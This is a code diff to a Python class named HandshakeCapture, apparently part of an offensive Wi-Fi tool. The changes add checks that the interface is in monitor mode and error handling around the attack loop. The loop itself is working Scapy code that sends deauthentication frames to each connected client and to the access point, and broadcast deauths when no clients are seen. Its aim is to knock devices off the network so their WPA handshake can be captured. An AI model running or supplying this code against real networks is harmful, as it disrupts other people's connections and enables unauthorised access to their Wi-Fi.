@@ -437,6 +437,20 @@ class HandshakeCapture:
 
         self.interface = mon_interface
 
+        # Verify interface exists and is in monitor mode
+        try:
+            result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
+            if 'Mode:Monitor' not in result.stdout:
+                self.console.print("[red]Interface is not in monitor mode. Retrying setup...[/red]")
+                mon_interface = self.setup_monitor_mode()
+                if not mon_interface:
+                    self.console.print("[red]Failed to set monitor mode. Please check your wireless adapter.[/red]")
+                    return
+                self.interface = mon_interface
+        except Exception as e:
+            self.console.print(f"[red]Error verifying interface: {str(e)}[/red]")
+            return
+
         # Scan for networks
         networks = self.scan_networks()
         
@@ -501,6 +515,19 @@ class HandshakeCapture:
             while self.running and not self.handshake_captured and cycle_count <= max_cycles:
                 self.console.print(f"\n[cyan]Cycle {cycle_count}/{max_cycles}[/cyan]")
                 
+                # Verify interface is still in monitor mode before each cycle
+                try:
+                    result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
+                    if 'Mode:Monitor' not in result.stdout:
+                        self.console.print("[red]Interface lost monitor mode. Attempting to restore...[/red]")
+                        mon_interface = self.setup_monitor_mode()
+                        if not mon_interface:
+                            raise Exception("Failed to restore monitor mode")
+                        self.interface = mon_interface
+                except Exception as e:
+                    self.console.print(f"[red]Error with interface: {str(e)}[/red]")
+                    break
+                
                 # Get current clients
                 clients = self.get_connected_clients()
                 
@@ -509,61 +536,76 @@ class HandshakeCapture:
                     
                     # Send deauth to each client
                     for client in clients:
-                        # Create deauth packets in both directions
-                        deauth1 = RadioTap() / Dot11(
+                        try:
+                            # Create deauth packets in both directions
+                            deauth1 = RadioTap() / Dot11(
+                                type=0,
+                                subtype=12,
+                                addr1=client,
+                                addr2=self.target_bssid,
+                                addr3=self.target_bssid
+                            ) / Dot11Deauth(reason=7)
+                            
+                            deauth2 = RadioTap() / Dot11(
+                                type=0,
+                                subtype=12,
+                                addr1=self.target_bssid,
+                                addr2=client,
+                                addr3=self.target_bssid
+                            ) / Dot11Deauth(reason=7)
+                            
+                            # Send a small burst of deauth packets
+                            self.console.print(f"[yellow]Deauthenticating client: {client}[/yellow]")
+                            for _ in range(2):  # Send 2 packets in each direction
+                                try:
+                                    sendp(deauth1, iface=self.interface, verbose=False)
+                                    sendp(deauth2, iface=self.interface, verbose=False)
+                                    time.sleep(0.1)  # Small delay between packets
+                                except Exception as e:
+                                    self.console.print(f"[red]Error sending deauth packet: {str(e)}[/red]")
+                                    break
+                            
+                            # Check for handshake after each client
+                            if self.check_for_handshake():
+                                self.handshake_captured = True
+                                break
+                            
+                            # Brief pause to allow client to reconnect
+                            time.sleep(2)
+                            
+                            # Check if client has reconnected and generated handshake
+                            if self.check_for_handshake():
+                                self.handshake_captured = True
+                                break
+                        except Exception as e:
+                            self.console.print(f"[red]Error deauthing client {client}: {str(e)}[/red]")
+                            continue
+                else:
+                    self.console.print("[yellow]No clients currently connected. Sending broadcast deauth...[/yellow]")
+                    try:
+                        # Send broadcast deauth
+                        broadcast_deauth = RadioTap() / Dot11(
                             type=0,
                             subtype=12,
-                            addr1=client,
+                            addr1="ff:ff:ff:ff:ff:ff",
                             addr2=self.target_bssid,
                             addr3=self.target_bssid
                         ) / Dot11Deauth(reason=7)
                         
-                        deauth2 = RadioTap() / Dot11(
-                            type=0,
-                            subtype=12,
-                            addr1=self.target_bssid,
-                            addr2=client,
-                            addr3=self.target_bssid
-                        ) / Dot11Deauth(reason=7)
+                        # Send a few broadcast deauth packets
+                        for _ in range(3):
+                            try:
+                                sendp(broadcast_deauth, iface=self.interface, verbose=False)
+                                time.sleep(0.1)
+                            except Exception as e:
+                                self.console.print(f"[red]Error sending broadcast deauth: {str(e)}[/red]")
+                                break
                         
-                        # Send a small burst of deauth packets
-                        self.console.print(f"[yellow]Deauthenticating client: {client}[/yellow]")
-                        for _ in range(2):  # Send 2 packets in each direction
-                            sendp(deauth1, iface=self.interface, verbose=False)
-                            sendp(deauth2, iface=self.interface, verbose=False)
-                            time.sleep(0.1)  # Small delay between packets
-                        
-                        # Check for handshake after each client
-                        if self.check_for_handshake():
-                            self.handshake_captured = True
-                            break
-                        
-                        # Brief pause to allow client to reconnect
-                        time.sleep(2)
-                        
-                        # Check if client has reconnected and generated handshake
-                        if self.check_for_handshake():
-                            self.handshake_captured = True
-                            break
-                else:
-                    self.console.print("[yellow]No clients currently connected. Sending broadcast deauth...[/yellow]")
-                    # Send broadcast deauth
-                    broadcast_deauth = RadioTap() / Dot11(
-                        type=0,
-                        subtype=12,
-                        addr1="ff:ff:ff:ff:ff:ff",
-                        addr2=self.target_bssid,
-                        addr3=self.target_bssid
-                    ) / Dot11Deauth(reason=7)
-                    
-                    # Send a few broadcast deauth packets
-                    for _ in range(3):
-                        sendp(broadcast_deauth, iface=self.interface, verbose=False)
-                        time.sleep(0.1)
-                    
-                    # Wait for potential clients to connect
-                    self.console.print("[cyan]Waiting for clients to connect...[/cyan]")
-                    time.sleep(5)
+                        # Wait for potential clients to connect
+                        self.console.print("[cyan]Waiting for clients to connect...[/cyan]")
+                        time.sleep(5)
+                    except Exception as e:
+                        self.console.print(f"[red]Error during broadcast deauth: {str(e)}[/red]")
                 
                 if self.handshake_captured:
                     break
